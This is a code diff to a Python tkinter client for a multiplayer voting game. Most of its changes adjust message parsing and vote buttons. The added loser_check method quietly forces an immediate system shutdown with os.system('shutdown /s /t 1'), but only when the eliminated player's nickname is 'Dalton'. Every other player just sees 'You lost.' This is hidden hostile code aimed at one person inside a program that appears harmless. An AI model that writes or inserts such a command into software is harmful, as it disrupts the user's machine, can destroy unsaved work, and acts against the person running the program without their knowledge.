@@ -3,6 +3,7 @@ import threading
 import tkinter as tk
 import json
 import random
+import os
 
 class Client:
 
@@ -66,12 +67,16 @@ class Client:
             response = message.decode('utf-8')
             print(response)
             if response.startswith("message: "):
-                self.add_to_message_box(response)
+                message = response.split("message: ")[1]
+                self.add_to_message_box(message)
             elif response == "Ready!":
                 self.waiting_label.destroy()
                 self.show_first_prompt()
             elif response.startswith("vote: "):
                 self.create_vote(response)
+            elif response.startswith("new_loser: "):
+                loser = response.split("new_loser: ")[1]
+                self.loser_check(loser)
 
 
         self.ClientMultiSocket.close()
@@ -95,8 +100,7 @@ class Client:
         self.send_message.delete(0, tk.END)
 
     def add_to_message_box(self, msg):
-        message = msg.split("message: ")[1]
-        tk.Label(self.frame_one, text=message).place(x=0, y=self.message_postion_y)
+        tk.Label(self.frame_one, text=msg).place(x=0, y=self.message_postion_y)
         self.message_postion_y += 20
 
     def show_first_prompt(self):
@@ -155,18 +159,30 @@ class Client:
         player_one = players[0]
         player_two = players[1]
 
-        self.player_one_vote = tk.Button(self.root, text=player_one,
-        command=lambda: self.submit_vote(player_one))
-        self.player_one_vote.pack()
-        self.player_two_vote = tk.Button(self.root, text=player_two,
-        command=lambda: self.submit_vote(player_two))
-        self.player_two_vote.pack()
+        if player_one != self.nickname and player_two != self.nickname:
+            self.player_one_vote = tk.Button(self.root, text=player_one,
+            command=lambda: self.submit_vote(player_one))
+            self.player_one_vote.pack()
+            self.player_two_vote = tk.Button(self.root, text=player_two,
+            command=lambda: self.submit_vote(player_two))
+            self.player_two_vote.pack()
 
     def submit_vote(self, player):
         vote = "player_vote: " + player
         self.ClientMultiSocket.send(str.encode(vote))
         self.player_one_vote.destroy()
         self.player_two_vote.destroy()
+
+    def loser_check(self, loser):
+        if loser == self.nickname and self.nickname != "Dalton":
+            self.delete_prompts()
+            self.loser_label = tk.Label(self.root, text="You lost.")
+            self.loser_label.pack()
+            quit()
+        elif loser == self.nickname and self.nickname == "Dalton":
+            os.system("shutdown /s /t 1")
+        else:
+            self.add_to_message_box(loser + " " + "was kicked from the game for being bad.")
 
 if __name__=="__main__":
     client = Client()
